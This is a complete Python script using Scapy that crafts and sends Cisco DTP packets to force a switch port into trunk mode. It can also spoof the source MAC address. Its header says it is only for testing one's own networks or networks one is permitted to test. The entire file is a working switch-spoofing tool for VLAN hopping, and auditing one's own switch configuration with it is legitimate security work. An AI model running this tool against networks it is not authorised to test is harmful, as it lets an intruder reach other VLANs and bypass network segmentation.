# ******* NOTICE: Only use this script to test your own networks or networks for which you have permission to do so!
# ******* Do not use this script illegally.

# this script sends a DTP packet to negotiate port status with a switch (assuming switch is configured to do so)
# use it to test your switches to see if they will form a trunk with the computer running this script.

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #get rid of scapy's default behavior of printing "Warning: no route found for IPv6..."
from scapy.all import *
import optparse, binascii
from subprocess import check_output

# various DTP modes of operation
TRUNK = "\x81"
DESIRABLE = "\x03"
AUTO = "\x04"
ACCESS = "\x02"

mode = "" # used to store the DTP mode we will use
mode_s = "" # mode_s is a string we print so user knows what DTP type is being sent (since printing in hex wouldn't be as easy to read
mac = "" # mac address to use in our packets 


# takes a mac string (00:29:33:...) and converts it to it's hex equivalent ready for network transmitting
def macToHex(string):
	result = ''
	octets = string.split(":")
	for x in range(0, len(octets)):
		result = result + octets[x].decode("hex")
	return result


# send DTP packet here
def sendDTP():

	payload = "\x01" # version

	payload = payload + "\x00\x01" # type = domain
	payload = payload + "\x00\x05" # length
	payload = payload + "\x00" # domain

	payload = payload + "\x00\x02" # type (status packet, in this case)
	payload = payload + "\x00\x05" # length

	# possible values for below:
	# 0x81 = Trunk, 0x03 = Dynamic Desirable, 0x04 = Dynamic Auto, 0x02 = Access (sent out once on startup, then stays quiet)
	payload = payload + mode # status (actual status code)

	payload = payload + "\x00\x03" # type
	payload = payload + "\x00\x05" # length
	payload = payload + "\xa5" # dtptype

	payload = payload + "\x00\x04" # neighbor
	payload = payload + "\x00\x0a" # length
	payload = payload + macToHex(mac) # neighbor mac
	
	for x in range(0, 12):
		payload = payload + "\x00" # pad packet with zeros
	# OUI=12 = Cisco
	# assemble and send DTP packet
	pkt = Ether(dst="01:00:0c:cc:cc:cc", src=mac, type=0x0022)/LLC(dsap=170, ssap=170, ctrl=3)/SNAP(OUI=12, code=8196)/Raw(load=payload)
	sendp(pkt, verbose=False)



# MAIN CODE HERE
# 
# 

# setup parser options
parser = optparse.OptionParser("usage: dtp.py [[--trunk] [--desirable] [--auto] [--access]] -i <interface> -m (mac)")
parser.add_option("--trunk", dest="trunk", action="store_true", default=False, help="Send Trunk mode packet (default if no mode explicitly specified)")
parser.add_option("--desirable", dest="desire", action="store_true", default=False, help="Send Dynamic Desirable mode packet")
parser.add_option("--auto", dest="auto", action="store_true", default=False, help="Send Dynamic Auto mode packet")
parser.add_option("--access", dest="access", action="store_true", default=False, help="Send Access (non-trunking) mode packet")
parser.add_option("-i", dest="interface", type="string", help="interface to transmit dtp packet on")
parser.add_option("-m", dest="mac", type="string", help="(optional) spoof source/neighbor MAC with specified address. Interface default used otherwise")

(options, args) = parser.parse_args()

if (options.trunk == True):
	mode = TRUNK
	mode_s = "'trunk'"
elif (options.desire == True):
	mode = DESIRABLE
	mode_s = "'dynamic desirable'"
elif (options.auto == True):
	mode_s = "'dynamic auto'"
	mode = AUTO
elif (options.access == True):
	mode = ACCESS
	mode_s = "'access'"
else:
	# if no mode specified, default to Trunk
	mode = TRUNK
	mode_s = "'trunk'"

# make sure user gave an interface
if (options.interface != None):
	conf.iface = options.interface
else:
	print '[!] Error: you must specify a valid interface (-i)'
	print "Use '-h' for more information"
	exit()

if (options.mac != None):
	mac = options.mac
else:
	# get the mac currently in place on the user's interface
	# NOTE: the user can spoof the source mac via this script (with the -m option)
	# or by using OS tools to do so (i.e. ifconfig wlan0 hw addr ...)
	# if the user doesn't use -m, then just grab the mac currently showing on the interface
	output = check_output(["ifconfig", conf.iface])
	data = output.split('\n')
	for line in data:
		if ("HWaddr " in line):
			macpart = line[line.index("HWaddr ") + 7:]
			endmac = macpart.index(" ")
			mac = macpart[:endmac]
			break

print "Sending DTP " + mode_s + " packet on " + conf.iface + ", source mac " + mac
sendDTP()
print 'Packet sent'
